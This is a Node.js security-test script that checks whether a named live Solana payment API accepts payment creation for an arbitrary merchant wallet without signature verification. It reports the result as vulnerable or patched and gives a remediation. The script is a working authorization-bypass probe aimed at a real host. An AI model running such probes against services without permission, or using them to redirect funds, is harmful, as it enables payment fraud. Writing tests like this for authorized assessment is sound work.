#!/usr/bin/env node
/**
 * AUTHZ-VULN-02 Test: Unauthorized Merchant Wallet Manipulation
 * Tests if POST /api/payments/create accepts arbitrary merchant wallet addresses
 * without proper signature verification.
 */

const https = require('https');

function testAuthzVuln02() {
    console.log("=".repeat(70));
    console.log("AUTHZ-VULN-02: Unauthorized Merchant Wallet Manipulation Test");
    console.log("=".repeat(70));
    console.log();

    // Test configuration
    const targetUrl = "https://solana-blik.vercel.app/api/payments/create";

    // Arbitrary merchant wallet (system program ID - clearly not our wallet)
    const testPayload = {
        amount: 1.5,
        merchantWallet: "11111111111111111111111111111111"
    };

    const postData = JSON.stringify(testPayload);

    console.log(`Target URL: ${targetUrl}`);
    console.log(`Method: POST`);
    console.log(`Request Body:`);
    console.log(JSON.stringify(testPayload, null, 2));
    console.log();
    console.log("-".repeat(70));
    console.log("Executing request...");
    console.log("-".repeat(70));
    console.log();

    const options = {
        hostname: 'solana-blik.vercel.app',
        path: '/api/payments/create',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, (res) => {
        let responseBody = '';

        console.log(`Status Code: ${res.statusCode}`);
        console.log();
        console.log("Response Headers:");
        Object.entries(res.headers).forEach(([key, value]) => {
            console.log(`  ${key}: ${value}`);
        });
        console.log();

        res.on('data', (chunk) => {
            responseBody += chunk;
        });

        res.on('end', () => {
            console.log("Response Body:");
            try {
                const responseJson = JSON.parse(responseBody);
                console.log(JSON.stringify(responseJson, null, 2));
                analyzeResponse(res.statusCode, responseJson);
            } catch (e) {
                console.log(responseBody);
                analyzeResponse(res.statusCode, responseBody);
            }
        });
    });

    req.on('error', (e) => {
        console.error(`Error: Request failed - ${e.message}`);
        console.log();
        console.log("Status: UNABLE TO TEST");
        console.log("=".repeat(70));
    });

    req.write(postData);
    req.end();
}

function analyzeResponse(statusCode, responseData) {
    console.log();
    console.log("=".repeat(70));
    console.log("VULNERABILITY ASSESSMENT");
    console.log("=".repeat(70));

    if (statusCode === 200) {
        if (typeof responseData === 'object' && responseData.paymentId && responseData.status) {
            console.log("Status: VULNERABLE ⚠️");
            console.log();
            console.log("Finding:");
            console.log("  The endpoint accepted an arbitrary merchant wallet address");
            console.log("  without proper authorization or signature verification.");
            console.log();
            console.log("Evidence:");
            console.log(`  - Received HTTP 200 OK`);
            console.log(`  - Payment ID created: ${responseData.paymentId}`);
            console.log(`  - Payment status: ${responseData.status}`);
            console.log();
            console.log("Impact:");
            console.log("  An attacker can create payment requests impersonating ANY");
            console.log("  merchant wallet address, potentially redirecting funds to");
            console.log("  unauthorized wallets.");
            console.log();
            console.log("Recommendation:");
            console.log("  Implement signature verification to ensure only the owner");
            console.log("  of a wallet can create payments for that wallet address.");
        } else {
            console.log("Status: UNEXPECTED RESPONSE");
            console.log("Response does not match expected vulnerable pattern.");
        }
    } else if (statusCode === 400) {
        console.log("Status: POTENTIALLY PATCHED ✓");
        console.log();
        console.log("The endpoint rejected the request with HTTP 400.");
        console.log("This suggests validation or authorization checks may be in place.");
    } else if (statusCode === 401 || statusCode === 403) {
        console.log("Status: PATCHED ✓");
        console.log();
        console.log("The endpoint properly rejected unauthorized merchant wallet.");
    } else {
        console.log(`Status: UNEXPECTED (${statusCode})`);
        console.log("Received unexpected status code.");
    }

    console.log("=".repeat(70));
}

// Execute the test
testAuthzVuln02();
